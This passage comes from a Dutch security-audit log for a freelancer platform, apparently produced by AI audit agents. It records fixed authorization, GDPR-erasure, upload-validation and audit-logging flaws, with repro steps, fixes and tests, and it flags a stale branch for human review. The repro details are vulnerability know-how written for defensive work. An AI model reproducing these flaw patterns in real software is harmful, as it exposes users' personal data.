- **Factuur-PDF IBAN** (`invoice-pdf.ts`, `facturen/[id]/pdf`) — IBAN + t.n.v. komen uit
  `collaboration.freelancer` (de crediteur), getoond aan de betrokken partijen + admin, 4-weg ownership +
  audit (toegestaan én geweigerd) + timing-veilige 404-maskering. Geen cross-party-lek. Schoon.
- **Billing-webhook** — rate-limit vóór al het werk, 64 KB body-cap, Stripe-handtekening via `timingSafeEqual`
  - 300s replay-tolerantie, gezaghebbende status-refetch, idempotente ledger-grendel, altijd 200. Schoon.
- `$queryRawUnsafe`=**0** (enige `$queryRaw`=parameterloze `SELECT 1`-healthprobes), enige
  `dangerouslySetInnerHTML`=nonce-theme-script, geen user-gestuurde server-`fetch`/SSRF (push achter
  allowlist, routing-host hardcoded), storage-driver `resolve()` blokkeert path-traversal, `npm audit
--omit=dev`=**0**, geen PII/secret in `console.*`, geen `.env` in git.

**Uitkomst:** authz-keten, tenant-isolatie, injectie/SSRF/upload/secrets/headers en de volledige delta
**schoon** — geen nieuwe KRITIEK/MIDDEL. **Eén HOOG + twee consistentie-items gedicht** (zie onder): de
erasure↔export-symmetrie-klasse (`LessonCompletion`/`IdeaVote`/`readAt`) had nog één ontsnapte instantie.

### OPGELOST — `SavedJob` overleefde erasure én ontbrak in export; `FavoriteFreelancer`-rij + `NotificationPreference` overleefden erasure (HOOG + 2× consistentie · AVG art. 15/17/20 · CLAUDE.md regel 5)

**Geschonden regel:** AVG art. 17 (recht op vergetelheid) — toewijsbare bookmark-/gedragsmetadata over de
betrokkene overleefde een verwijderverzoek; art. 15/20 (inzage/portabiliteit) — de betrokkene kon zijn eigen
opgeslagen opdrachten niet exporteren. Zelfde residuele-gedragsmetadata-klasse als `LessonCompletion`/
`IdeaVote`/`readAt` (eerdere rondes), hier voor de bookmark-modellen.

**Repro (vóór de fix):**

- **`SavedJob`** (`prisma/schema.prisma:1403`, `freelancerProfileId + jobId + createdAt`, `onDelete: Cascade`) —
  `anonymizeUser` (`admin/gebruikers/actions.ts`) anonimiseert het profiel via
  `freelancerProfile.updateMany` (een **update**, geen delete), dus de cascade op
  `SavedJob.freelancerProfileId` vuurt nooit. Er was géén `savedJob.deleteMany`. Na een voltooide erasure gaf
  `SELECT * FROM SavedJob WHERE freelancerProfileId = <behouden profiel-id>` nog steeds de bookmark-historie
  (welke vacatures de nu-geanonimiseerde persoon bewaarde, mét tijdstip). Spiegelbeeldig ontbrak `SavedJob` in
  `buildAccountExport` (`account-export.ts`), terwijl het spiegelmodel `FavoriteFreelancer.note` (opdrachtgever)
  wél werd geëxporteerd → de betrokkene kon zijn eigen bookmarks niet inzien.
- **`FavoriteFreelancer`-rij** (LAAG) — de erasure redacteerde enkel `note` (`updateMany({data:{note:null}})`); de
  rij zelf (`companyId + freelancerProfileId + createdAt`) bleef staan, joinbaar aan het geanonimiseerde bedrijf
  ("deze verwijderde opdrachtgever bookmarkte deze ZZP'ers, op deze tijdstippen").
- **`NotificationPreference`** (LAAG/MIDDEL, `schema.prisma:274`, `userId + category + emailEnabled`) — geen
  `deleteMany` in `anonymizeUser`; de opt-out-config overleefde als "welke e-mailcategorieën deze
  (geanonimiseerde) gebruiker uitzette".

**Fix (dit PR):**

- `prisma.savedJob.deleteMany({ where: { freelancer: { userId } } })` + `prisma.notificationPreference.deleteMany
({ where: { userId } })` toegevoegd aan de anonimiseringstransactie (hard delete — rij = enkel persoonlijke
  data, geen tegenpartij-/retentiewaarde; `onDelete: Cascade` markeert `SavedJob` al als wegwerpbaar).
- `FavoriteFreelancer`-handling omgezet van `updateMany({note:null})` naar `deleteMany` (héle rij wist; de
  ZZP'er ziet deze privé-bookmark nooit → geen tegenpartij-waarde). Gescopet op `company: { userId }`.
- `SavedJob` toegevoegd aan `buildAccountExport` (`savedJobs`, smalle select `{ jobId, createdAt }`, gescopet op
  `freelancer: { userId: actorId }`).
- **Tests (rood→groen):** `anonymize-erasure.test.ts` — drie nieuwe/aangepaste cases asserteren de drie
  `deleteMany`'s met de juiste owner-scope (zonder de bronwijziging: `find(...) === undefined` →
  `toBeDefined()` faalt); `account-export.test.ts` — `savedJobs` sectie-presence + scope/select-assert op
  `freelancer.userId`. Volledige gate groen (typecheck, lint, 6407 unit-tests, build, prettier).

## Ronde 2026-08-19 (basis: `main` @ 126505f6) — 1× LAAG OPGELOST (behavioural-metadata overleefde erasure + ontbrak in export)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op niet-overlappende oppervlakken.

1. **server-action-authz-keten** — alle `(protected)/**/actions.ts` (m.u.v. `admin/**`+`franchise/**`) + `src/lib/actions/**`

- de cascade-command-laag (`src/lib/cascade/*-commands.ts`): IDOR/rol/ownership/Zod/mass-assignment/status-transitie/audit.

2. **AVG erasure↔export-symmetrie** — volledige `schema.prisma`-modelsweep (60+ modellen) vs. `account-anonymization.ts`/
   `anonymizeUser`/`account-export.ts`. 3) **multi-tenant/franchise-isolatie + document-/media-/PDF-/dossier-serving +
   bearer-tokens** — `tenancy.ts`, `franchise/**`, `api/documents/[id]`, `api/media/[...key]`, alle PDF-/dossier-routes,
   `storage.ts` path-traversal, `vertrouwen/[profileId]/[token]`, `api/agenda/feed.ics`. Plus orchestrator-probes op de
   delta `d61d5236..126505f6` (6 commits: ORT-uitsplitsing in de urenstaat-CSV-exports, afgenomen-uren-trend, urenstaat-
   uitschieter-signaal, cron-faal-attributie): nieuwe CSV-kolommen zijn **numeriek** (uren/EUR, geen user-tekst) → geen
   CWE-1236 formule-injectie; `toCsv`/`escapeCsvField` behouden de formule-guard + RFC-4180-quoting; alle nieuwe
   aggregaties (`worked-hours-trend`, `performance-hours-anomaly`, `ort-breakdown`) zijn owner-gescoopt via geneste
   Prisma-`where` (`collaboration.freelancer.userId`/`company.userId`), read-only, deterministisch. `$queryRawUnsafe`=**0**,
   enige `dangerouslySetInnerHTML`=nonce-theme-script, geen user-gestuurde `fetch`/SSRF (push-endpoint achter allowlist),
   `npm audit --omit=dev`=**0**, geen PII in `console.*`.

**Uitkomst:** authz-keten, tenant-isolatie, document-serving en erasure-completeness **schoon** — geen nieuwe
KRITIEK/HOOG/MIDDEL. **Eén geparkeerde LAAG gedicht** (zie onder). De HOOG bij-de-mens-`Review.comment`-subjectkant
(regel 927-935) en de e-mail-enumeratie-LOW blijven geparkeerd.

### OPGELOST — `LessonCompletion` + `IdeaVote` overleefden erasure én ontbraken in export (LAAG · AVG art. 15/17/art. 5 minimalisatie)

**Geschonden regel:** AVG art. 17 (recht op vergetelheid) + art. 5 (dataminimalisatie) — toewijsbare gedragsmetadata
over de betrokkene overleefde een verwijderverzoek; en art. 15/20 (inzage/portabiliteit) — de betrokkene kon deze
eigen data niet exporteren. Was geparkeerd sinds ronde 2026-08-18b (regel 313-319).

**Repro (vóór de fix):** `prisma/schema.prisma` — `LessonCompletion` (`userId` + `completedAt`) en `IdeaVote`
(`userId` + `createdAt`) dragen elk uitsluitend de eigen `userId` + een zelf-actie-timestamp. `anonymizeUser`
(`src/app/(protected)/admin/gebruikers/actions.ts`) overschrijft de `User`-rij **in place** (de id blijft), dus deze
kindrijen bleven volledig gekoppeld staan: welke academielessen de nu-geanonimiseerde persoon afrondde en op welke
ideeën hij stemde, mét het exacte tijdstip. Een `user.update` triggert geen cascade → de rijen overleefden art. 17.
Spiegelbeeldig ontbraken beide in `buildAccountExport` (`src/lib/account-export.ts`), dus de betrokkene kon ze niet
inzien/exporteren. Zelfde residuele-gedragsmetadata-klasse als `readAt`/`lastReadAt`/`lastLoginAt` (eerder gedicht),
maar hier symmetrisch afwezig aan beide kanten.

**Fix (dit PR):** `prisma.lessonCompletion.deleteMany({ where: { userId } })` + `prisma.ideaVote.deleteMany({ where:
{ userId } })` toegevoegd aan de anonimiseringstransactie (hard delete — de rij = enkel persoonlijke data, geen
gedeelde/tegenpartij-waarde; `onDelete: Cascade` vanaf zowel User als Idea/Lesson markeert ze al als wegwerpbaar,
net als `workExperience`/`pushSubscription`). Symmetrisch: beide modellen toegevoegd aan `buildAccountExport`
(`lessonCompletions`/`ideaVotes`, smalle select `{ lessonId, completedAt }`/`{ ideaId, createdAt }`, gescopet op de
eigen `userId`). **Test (rood→groen):** `anonymize-erasure.test.ts` — twee nieuwe cases asserteren dat beide
`deleteMany`'s met `where: { userId }` in de transactie zitten (zonder de bronwijziging: `find(...) === undefined` →
`toBeDefined()` faalt); `account-export.test.ts` — sectie-presence + scope/select-assert op de eigen `userId`.

## Ronde 2026-08-18b (basis: `main` @ d61d5236) — 1× MIDDEL OPGELOST (fail-open rol-dispatch lekte admin-taken)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op niet-overlappende oppervlakken van
de delta `590ffb7f..d61d5236` (18 commits): 1) **BI-/aggregatie-/reputatie-privacy** — `client-spend-breakdown`,
`freelancer-revenue-breakdown`, `client-stats`, `freelancer-stats`, `revenue-trend`, `freelancer-reputation`
(+`data/`), `roster-engageability`, `diensten-summary`, `market-rate` k-anonimiteit, `public-trust` en de
publieke bearer-token-dossierpagina `vertrouwen/[profileId]/[token]` (+33 regels reputatiesectie); 2)
**server-action-authz-keten** — `actions/pending-tasks.ts` (+292), `actions/tasks.ts`, `diensten/**`
(import/export/page); 3) **multi-tenant/franchise-isolatie** — `franchise/diensten` + `franchise/opdrachtgevers`
(lijst + detail `[id]`), `franchise/client-health`, `franchise/dienst-status-filter`, `tenancy.ts`. Plus
orchestrator-probes: `$queryRawUnsafe`/`queryRawUnsafe`=**0**, enige `dangerouslySetInnerHTML`=nonce-theme-script
(`layout.tsx`), geen user-gestuurde `fetch`/SSRF, geen param-gestuurde open redirect, `api/metrics` = CRON_SECRET
bearer fail-closed (geen PII/secret in output, `no-store`).

**Uitkomst:** BI-surface + franchise-tenant-isolatie (incl. de detail-`[id]`-routes: `getDienstDetail` faalt
gesloten op `job.tenantId !== tenantId`; `setDienstStatus`/`removeDepartment`/`proposeFreelancer` allen
`ownsViaTenant`-gescoopt + geaudit) **schoon** — geen nieuwe KRITIEK/HOOG. **Eén MIDDEL fail-open gedicht**
(zie onder). Twee LAAG-items geparkeerd.

### OPGELOST — Fail-open rol-dispatch in `computeTasks` lekt platform-brede admin-taken bij een onbekende rol (MIDDEL · OWASP A01 · CLAUDE.md regel 1 fail-closed + regel 6 enums-als-strings)

**Geschonden regel:** Server-side waarheid / fail-closed (regel 1) + enums-als-strings (regel 6) + OWASP A01
(Broken Access Control — fail-open default).

**Repro (vóór de fix):** `src/lib/actions/pending-tasks.ts:319-326`. De rol-dispatch `computeTasks(userId, role)`
behandelde met `return rankTasks(await adminTasks())` álles wat geen `FREELANCER`/`CLIENT`/`FRANCHISER` was als
admin. `adminTasks()` is bewust ongescoopt en geeft platform-brede, gevoelige PII terug: AVG-verwijderverzoeken
(mét naam), open disputen, no-show-meldingen, SUBMITTED-verificatie-inzenders (mét naam), open supporttickets.
Rollen zijn strings (regel 6), en `pendingTaskCount(userId, role: string)` (sidebar-badge in `app-shell.tsx`)
neemt de rol als vrije string aan. Een out-of-enum rol (bad migration, directe DB-write, een toekomstige 5e rol
die deze switch niet bijwerkt) viel zo stil door naar de volledige admin-takenlijst i.p.v. te weigeren. Test met
een gemockte SUBMITTED-verificatie bevestigde: onbekende rol → adminTasks() draaide → de inzender-PII kwam als
taak terug (`pendingTaskCount` telde 'm mee).

**Fix (dit PR):** expliciete `if (role === "ADMIN") return rankTasks(await adminTasks());` + `return []` op de
fallthrough (fail-closed). Alleen een expliciete ADMIN ziet nog adminTasks; elke onbekende rol krijgt een lege
lijst. **Test (rood→groen):** `src/lib/actions/pending-tasks-unknown-role-fail-closed.test.ts` — onbekende rol
→ `[]` én géén admin-query aangeraakt (rood: lekte de gemockte verificatie); `pendingTaskCount(..,"DEMO")` = 0;
controle: ADMIN raakt de admin-queries nog wél (fix beperkt tot onbekende rollen).

### GEPARKEERD — Sidebar-badge `pendingTaskCount` voedt zich met de (mogelijk stale) JWT-rol i.p.v. een verse DB-rol (LAAG · CLAUDE.md regel 1 in spirit)

**Repro:** `src/components/app-shell.tsx:35,41` roept `pendingTaskCount(user.id, user.role)` met `user.role` uit
de sessie/JWT (`auth.config.ts`: rol wordt op de JWT gezet bij inlog, niet her-gelezen uit de DB tijdens de
silent refresh binnen `maxAge`). Een mid-sessie gedegradeerde ex-admin ziet z'n badge-telling nog even de
admin-wachtrij-omvang weerspiegelen tot de token cyclet. **Alleen count** (geen entiteit-PII: `/acties` zelf
gebruikt `requireActor()` → verse DB-rol, dus de takenlíjst lekt niet), self-healing binnen het sessievenster,
en `/admin`-toegang wordt door verse `requireRole`-checks alsnog geblokkeerd. **Aanbevolen fix:** laat de
sidebar-badge een verse rol afleiden (`currentActor()`) of laat `pendingTaskCount` een geverifieerde `Actor`
aannemen i.p.v. een rauwe `role: string`. Cosmetisch/badge-only → LAAG; de fail-closed dispatch hierboven dekt
bovendien het onbekende-rol-deel af (een stale-maar-geldige "ADMIN" blijft over).

### GEPARKEERD — Reputatie-aggregaat zonder minimum-sample-drempel (LAAG · informatief)

**Repro:** `src/lib/data/freelancer-reputation.ts` toont het reputatie-gemiddelde zodra `count >= 1`; bij precies
één gepubliceerde beoordeling is het getoonde gemiddelde numeriek gelijk aan die ene score. Dit betreft de
**eigen** reputatie van de ZZP'er (die de dossierlink zelf deelt), geen derde-partij-PII, en volgt de bestaande
platformconventie (`company-reputation`, `candidate-reviews` hebben ook geen min-count-gate). **Geen exploit.**
**Aanbeveling (optioneel, consistentie):** een uniforme `n>=3`-vloer over alle review-surfaces overwegen.

## Ronde 2026-08-18 (basis: `main` @ 590ffb7f) — 1× MIDDEL OPGELOST (platformfactuur-PDF not-found-tak ongeaudit)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op niet-overlappende oppervlakken
(1: **BI-/aggregatie-privacy** — `/inzicht`, `freelancer-payer-behavior.ts` (delta), `placements-trend.ts` (delta),
alle `*-breakdown/*-behavior/*-trend`-libs, `market-rate.ts` k-anonimiteit, `api/metrics` + franchise-BI/-exports;
2: **server-action-authz-keten** — alle `(protected)/**/actions.ts` behalve `franchise/**`+`admin/**`: IDOR/rol/Zod/
mass-assignment/status-transities/audit; 3: **multi-tenant/franchise-isolatie + document-/media-/PDF-serving** —
`tenancy.ts`, `franchise/**`, `api/documents/[id]`, `api/media/[...key]`, alle PDF-/dossier-routes, `storage.ts`
path-traversal/upload). Plus orchestrator-probes (delta `a8a454bb..590ffb7f`: nieuwe BI-kaarten
betaalgedrag-per-opdrachtgever + plaatsingen-trend, `ideeen`-rate-limit, `metrics`-route — allen server-side
gescoopt/geaudit; `$queryRawUnsafe`=0; enige `dangerouslySetInnerHTML`=nonce-theme-script; geen user-gestuurde
`fetch`/SSRF; geen open redirect; alle 13 CSV-exports via `escapeCsvField` (CWE-1236 formule-injectie-veilig);
mail-noop/observability loggen geen PII in productie (M-3 intact); `npm audit --omit=dev`=**0**).

**Uitkomst:** delta + kernoppervlakken **schoon** — geen nieuwe KRITIEK/HOOG/MIDDEL exploiteerbare gaten. OWASP
Top-10-dekking: A01 (authz/IDOR/tenant — anti-oracle 404 + TOCTOU compound-guards uniform), A02 (SSE-at-rest op
elke upload), A03 (0× raw SQL / geen user-XSS / CSV-formule-guard), A04 (per-doel MIME-allowlist + magic-bytes),
A05 (CSP-nonce + rate-limits op login/register/reset/message/upload), A07 (reset-token: 32-byte random, sha256-at-
rest, 1u TTL, atomair eenmalig; sessie-invalidatie bij wachtwoordwijziging), A09 (audit op elke gevoelige actie +
denied-access-timing-pariteit). **Eén tracked MIDDEL audit-completeness-gat gefixt** (zie onder); de rest van de
geparkeerde items blijft staan.

### OPGELOST — Platformfactuur-PDF-route auditte de not-found-tak niet (MIDDEL · OWASP A09 · CWE-208 · Architectuurregel 5)

**Geschonden regel:** Architectuurregel 5 (audit alles wat telt) + OWASP A09 (security logging) + CWE-208
(observable timing discrepancy). Was al geparkeerd in ronde 2026-08-17b.

**Repro (vóór de fix):** `src/app/api/admin/facturatie/[id]/pdf/route.ts:29-30` gaf bij
`getPlatformBillingInvoiceDetail(id) === null` een 404 **zonder** auditregel, terwijl álle sibling-PDF-/document-
routes (`facturen/[id]/pdf`, `prestaties/[id]/pdf`, `documents/[id]`, de dossier-routes) vóór hun 404
`auditDeniedAccess(... outcome:"not-found")` schrijven. De success-tak van déze route deed wél `requestMeta()` +
`audit()` (een DB-write); de not-found-tak keerde direct terug → (a) een admin die op niet-bestaande
platformfactuur-id's probeert (recon) liet geen forensisch spoor na, en (b) het verschil in werk (write vs. geen
write) is meetbaar aan de responstijd (CWE-208). **Geen IDOR** (route is `requireRole("ADMIN")`; admin heeft
blanket-toegang) — dus audit-/timing-volledigheid, niet vertrouwelijkheid. Nul testdekking op deze tak.

**Fix (dit PR):** `auditDeniedAccess({ action:"PLATFORM_BILLING_PDF_ACCESS_DENIED", entityType:"PlatformInvoice",
entityId:id, outcome:"not-found" })` vóór de 404 — spiegelt exact de sibling-routes en het gedeelde
`access-audit.ts`-afsluitpunt (identiek werk op beide takken → geen timing-zijkanaal). **Test (rood→groen):**
`src/app/api/admin/facturatie/platform-pdf-audit.test.ts` — "niet-bestaande factuur: 404 én een
PLATFORM_BILLING_PDF_ACCESS_DENIED-auditregel"; faalt zonder de audit-aanroep (0 audit-calls op de not-found-tak).

## Ronde 2026-08-17b (basis: `main` @ a8a454bb) — 1× KRITIEK + 1× HOOG OPGELOST (bericht-erasure-lek + privé-certificaat op publiek dossier)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op niet-overlappende oppervlakken
(1: **bearer-token/publieke feeds** — `/vertrouwen/[profileId]/[token]`, `/api/agenda/feed.ics`, share-/feed-tokens,
`password-reset`, `shared-credentials`; 2: **erasure↔export-symmetrie** — volledige `schema.prisma`-sweep +
`account-anonymization.ts`/`account-export.ts`/`admin/gebruikers/actions.ts`; 3: **document-/media-serving + IDOR** —
`api/media/[...key]`, `api/documents/[id]`, alle PDF-/dossier-routes, `storage.ts` path-traversal, `/admin`-RBAC).
Plus orchestrator-probes (delta `c33670cd..a8a454bb`: nieuwe CSV-exports `administratie/uitgaven` + `franchise/
opdrachtgevers` en `metrics`-route — allen server-side gescoopt/geaudit/formule-injectie-veilig; `$queryRawUnsafe`=0;
enige `dangerouslySetInnerHTML`=nonce-theme-script; geen user-gestuurde `fetch`/SSRF; geen open redirect; geen PII
in `console.*` (mail-noop logt geen adres in productie, M-3 intact); `npm audit --omit=dev`=**0**).

**Uitkomst:** delta schoon; **twee reeds bestaande gaten gevonden én gefixt** (zie onder). De rest geparkeerd
(2× MIDDEL audit-volledigheid, 1× LAAG, plus een MENSENWERK-escalatie over een stale ongemergde branch).

### OPGELOST — Berichttekst overleeft afzender-erasure via een verbatim kopie in `Notification.body` op de ontvangersfeed (KRITIEK · AVG art. 17 vs. art. 15/20 · Architectuurregel 5 · OWASP A01)

**Geschonden regel:** Architectuurregel 5 (audit/erasure alles wat telt) + AVG art. 17 (vergetelheid) tegenover
art. 15/20 (inzage/portabiliteit). Zelfde multi-kopie-klasse als eerder gedicht voor `INVOICE_CREDITED`,
`NO_SHOW_REPORTED`, `SHIFT_HANDOFF_REJECTED` — hier op de **MESSAGE**-notificatie, het meest gevoelige
vrije-tekstkanaal (directe berichten op een VOG/diploma-platform).

**Repro (vóór de fix):** ZZP'er A stuurt opdrachtgever B een bericht `"Bel me op 06-12345678, adres Kerkstraat 12"`
(≤120 tekens). `sendMessage` (`berichten/actions.ts`) maakt een `Notification{ userId: B, type: "MESSAGE",
body: <bericht verbatim> }` op **B's** feed. A dient een art. 17-verzoek in; admin draait `anonymizeUser(A.id)`.
De erasure redact `Message.body` (senderId==A) én de notificaties op A's **eigen** feed (`where: { userId: A }`),
maar raakt de kopie op **B's** feed nooit → A's telefoon/adres blijft onbeperkt leesbaar op B's feed **én** in B's
AVG-inzage-export (`account-export.ts:179` geeft `Notification.body` onvoorwaardelijk prijs). `grep` bevestigde:
geen enkele test dekte `Message.body`-redactie of de MESSAGE-notificatiekopie.

**Fix (dit PR):** gedeelde, drift-vrije body-builder `messageNotificationBody` + `MESSAGE_NOTIFICATION_BODY_MAX`
(`src/lib/messaging.ts`), gebruikt door zowel `sendMessage` als de erasure. `anonymizeUser` snapshot vóór de
transactie de eigen verzonden berichten (`senderId==userId`) en redact per uniek (gesprek, body-slice) de exacte
notificatiekopie (`type: "MESSAGE"` + `link: /berichten/<conv>` + exacte `body`) op álle feeds — spiegelt de
no-show-/handoff-/dispuut-behandeling. **Test (rood→groen):** `anonymize-erasure.test.ts` — "redact de berichttekst
óók uit de MESSAGE-notificatie op de feed van de ONTVANGER"; faalt zonder de transactie-op (geen MESSAGE-updateMany).

### OPGELOST — Publiek vertrouwensdossier lekte PRIVÉ-gemarkeerde certificaten (VOG/BIG/diploma) via de bearer-URL (HOOG · OWASP A01 · AVG art. 5(1)(a)/(b) · Architectuurregel 1)

**Geschonden regel:** Architectuurregel 1 (server-side waarheid; consent-status niet inconsistent tussen views) +
OWASP A01 (broken access control — inconsistente autorisatie tussen twee views op dezelfde resource) + AVG art.
5(1)(a)/(b) (doelbinding/grondslag: de per-certificaat consent-toggle).

**Repro (vóór de fix):** `Credential.visibility` staat **standaard op PRIVATE** (`schema.prisma:654`) en is een
per-certificaat consent-toggle op `/certificaten`. De sibling publieke viewer `/zzp/[id]` honoreert 'm
(`profile-screen.tsx:316` → `publicCredentials = filter(c => c.visibility === "PUBLIC")`). Maar het publieke,
niet-verlopende bearer-dossier `/vertrouwen/[profileId]/[token]/page.tsx` selecteerde `where: { status: "VERIFIED" }`
**zonder** visibility-filter en toonde élk geverifieerd certificaat bij type/titel/uitgever/verificatiebron — én
telde ze mee in het vertrouwensniveau + de verplichte-documenten-check. Een ZZP'er die alleen z'n diploma openbaar
maakte maar VOG/BIG privé hield, lekte die privé-certificaten aan iedereen met de deellink (niet per-certificaat
intrekbaar). Nul testdekking (alle fixtures gebruikten `credentials: []`).

**Fix (dit PR):** de credentials-query filtert nu `where: { status: "VERIFIED", visibility: "PUBLIC" }` — PRIVÉ-
certificaten verlaten deze route niet (tightest fix; consistent met `/zzp/[id]`). **Test (rood→groen):**
`vertrouwen-liveness.test.ts` — "laadt alléén OPENBAAR-gemaakte certificaten"; assert de query-vorm, faalt zonder
de fix (`where` enkel `{ status: "VERIFIED" }`).

### GEPARKEERD (repro + severity)

- **~~Ontbrekende `auditDeniedAccess` op de not-found-tak van de platform-factuur-PDF-route (MIDDEL · OWASP A09/CWE-208 · Architectuurregel 5).~~ → OPGELOST in ronde 2026-08-18 (zie boven).**
  `src/app/api/admin/facturatie/[id]/pdf/route.ts:29-30` geeft bij `getPlatformBillingInvoiceDetail(id) === null`
  een 404 **zonder auditregel** — terwijl álle sibling-PDF-/document-routes (`documents/[id]`, `facturen/[id]/pdf`,
  `prestaties/[id]/pdf`, `samenwerkingen/[id]/{modelovereenkomst,dossier,dba-dossier}`) vóór dezelfde 404
  `auditDeniedAccess(... outcome: "not-found")` schrijven (recon-logging + timing-pariteit, CWE-208). Deze route
  kreeg wél de success-audit (2026-06-25) maar werd niet meegenomen in de latere denied-access-retrofit; de not-found-
  tak heeft geen regressietest. **Geen IDOR** (route is `requireRole("ADMIN")`; admin heeft blanket-toegang), dus
  audit-/timing-volledigheid, niet vertrouwelijkheid. **Fix:** voeg `auditDeniedAccess({ action:
"PLATFORM_BILLING_PDF_ACCESS_DENIED", entityType: "PlatformInvoice", entityId: id, outcome: "not-found" })` toe
  vóór de 404 + regressietest (pariteit met `pdf-routes-audit.test.ts`).
- **~~Agenda-ICS-feed (`/api/agenda/feed.ics`) heeft geen enkel audit-signaal op een niet-intrekbare bearer-feed met derde-partij-PII (MIDDEL · OWASP A09 · Architectuurregel 5).~~ → OPGELOST in ronde 2026-08-21b (zie boven): `auditAgendaFeedView` + `AGENDA_FEED_VIEWED`, gede-dupliceerd per (gebruiker, bron-IP, dag).**
- **~~`/vertrouwen`-dossier-audit mist `ipAddress`/`userAgent` (LAAG · AVG art. 5(2) volledigheid).~~ → OPGELOST in ronde 2026-08-21b (zie boven): `page.tsx` leest nu ook `userAgent` en geeft `ipAddress`/`userAgent` mee aan de bestaande `audit()`.**
- **`/api/documents/[id]` blob-missing-tak zonder audit (LAAG · AVG art. 5(2) volledigheid).** Ongewijzigd sinds
  vorige ronde (`route.ts:70-71`): na geslaagde autorisatie geeft `storage.exists === false` een 404 zonder audit,
  terwijl found/forbidden/success wél auditen. Niet exploiteerbaar (post-autorisatie, eigen document); stille gat
  in de toegang-trail. **Fix:** route deze tak door hetzelfde `audit`-patroon (bv. `DOCUMENT_BLOB_MISSING`).

### MENSENWERK-escalatie (branch-hygiëne — geen codegat)

- **Stale ongemergde branch `origin/feat/auto-20260816-122711-556` (PR #1115, "gepubliceerde reputatie op het
  portable vertrouwensdossier").** Deze branch (commit `d3e7d225`, ~13 commits achter `main`) is NIET in `main` —
  ondanks dat de routine-opdracht suggereerde dat de reputatie al gepubliceerd was. Bevat ook een verweesde,
  racende WIP-commit van een tweede agent. Op eigen merites lijkt de code redelijk (alleen geaggregeerde PUBLISHED-
  reviews, geen individuele auteurstekst), maar is stale en niet door de CI-/agent-review-poort. **Actie voor de
  mens:** (a) bevestig dat 'ie niet stil gemerged/gedeployed wordt buiten de poort; (b) bij rebase+merge: hertoets
  tegen het hierboven gefixte visibility-gat — #1115 voegt een NIEUWE sectie toe aan exact dezelfde pagina.

## Ronde 2026-08-17 (basis: `main` @ c33670cd) — 1× MIDDEL OPGELOST (logo-upload accepteerde PDF)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op niet-overlappende oppervlakken
(1: **machine-/ongeauthenticeerde endpoints** — alle `src/app/api/tasks/**`, `backups/heartbeat`, `metrics`,
`csp-report`, `client-error`, `push/**`, `billing/webhook`, `health`, `readiness` + hun guards
(`cron-auth.ts`, `rate-limit.ts`, `client-ip.ts`, Stripe-signature); 2: **document-/media-serving** —
`api/media/[...key]`, `api/documents/[id]`, alle PDF-/dossier-/export-routes + `storage.ts` op
path-traversal/IDOR/audit/CSP; 3: **cross-tenant/franchise + mass-assignment** — alle `franchise/**`-actions/
-routes, `lib/franchise/**`, `tenancy.ts`, `tenant-billing/**` + overposting/status-transitie-sweep). Plus
orchestrator-probes (`dangerouslySetInnerHTML`, `$queryRawUnsafe`, open-redirect/callbackUrl, SSRF via
`new URL`/`fetch`, `npm audit --omit=dev`).

**Uitkomst:** cross-tenant/franchise + mass-assignment **schoon** (elke id-accepterende mutatie her-scoopt
server-side via `ownsViaTenant`/`tenantScopeWhere`; geen `data:{...raw}`-spread; status via expliciete
transitiemaps). Injectie/redirect/SSRF/deps **schoon** (0× `$queryRawUnsafe`; enige
`dangerouslySetInnerHTML` = het nonce-gepoorte theme-script; geen user-gestuurde server-fetch;
`npm audit --omit=dev` = **0**). **Eén MIDDEL upload-/server-side-truth-gat gevonden én gefixt** (zie onder);
2 items geparkeerd met repro (1 cron-hardening, 1 LAAG audit-volledigheid).

### OPGELOST — Bedrijfslogo-upload accepteerde een echte PDF, inline geserveerd via `/api/media` (MIDDEL · CWE-434 / OWASP A04 · Architectuurregel 1 + 4)

**Geschonden regel:** Architectuurregel 1 (server-side is de waarheid) + 4 (upload altijd valideren op type).
OWASP A04:2021 (Insecure Design) / CWE-434 (Unrestricted Upload of File with Dangerous Type).

**Repro (vóór de fix):** een `CLIENT` bewerkt het eigen bedrijfsprofiel en POST een écht PDF-bestand als
`logo`-veld (rauwe form-POST/devtools, langs het client-`accept="image/png,image/jpeg,image/webp"` heen).
`validateUpload`/`assertContentMatchesMime` in `bedrijf/actions.ts` valideerden tegen de brede,
gedeelde `ALLOWED_MIME_TYPES` (incl. `application/pdf`) — de PDF passeerde met geldige magic-bytes en
malware-scan, `Company.logoKey` werd gezet. Vervolgens serveert `api/media/[...key]/route.ts` (branch
`ext === "pdf" → application/pdf`) het bestand **inline** aan élke ingelogde gebruiker (alle rollen/tenants),
**zonder audit en zonder CSP** — content-hosting/phishing vanaf het vertrouwde platform-domein, en een
valse "logo's zijn altijd onschuldige afbeeldingen"-aanname in de threat-model van de media-route.

**Fix (dit PR):** `validateUpload`/`assertContentMatchesMime` (`src/lib/services/storage.ts`) krijgen een
optionele `allowed`-parameter (default = alle types, dus documenten/certificaten ongewijzigd);
`bedrijf/actions.ts` geeft de nieuwe `IMAGE_MIME_TYPES`-allowlist mee → een PDF (of ander niet-beeld-type)
wordt nu **server-side** geweigerd, óók wanneer de client het type eerlijk als `application/pdf` opgeeft
(de signatuur matcht dan wél, maar valt buiten de allowlist — tweede poort). Defense-in-depth: de
media-route zet nu ook een `Content-Security-Policy: sandbox; default-src 'none'` op de gestreamde
respons (parity met de document-route). **Test (rood→groen):** `storage.test.ts` — "weigert een PDF wanneer
alleen afbeeldingen zijn toegestaan (logo-upload)" + "weigert een echte PDF onder de alleen-afbeelding
allowlist (logo)". Zonder de `allowed`-param vallen beide terug op de PDF-inclusieve `ALLOWED_MIME_TYPES`
en falen → rood; met de fix groen.

### GEPARKEERD (repro + severity)

- **Cron-/taakroutes zonder rate-limiting op de `CRON_SECRET`-check + geen minimum-entropie (HOOG-contingent → praktisch MIDDEL · OWASP A07 · defense-in-depth).**
  `src/lib/cron-auth.ts` doet een correcte `timingSafeEqual` (Bearer-only), maar de 16 cron-gepoorte routes
  (`src/app/api/tasks/**`, `run-all`, `backups/heartbeat`, `metrics`) hebben **geen rate-limiter** op een
  mislukte auth — anders dan `csp-report`/`client-error`/`billing/webhook`. `env.ts` valideert `CRON_SECRET`
  niet op minimumlengte (contrast: `AUTH_SECRET` hard `min(16)` + waarschuwing `< 32`). **Repro:** zet een
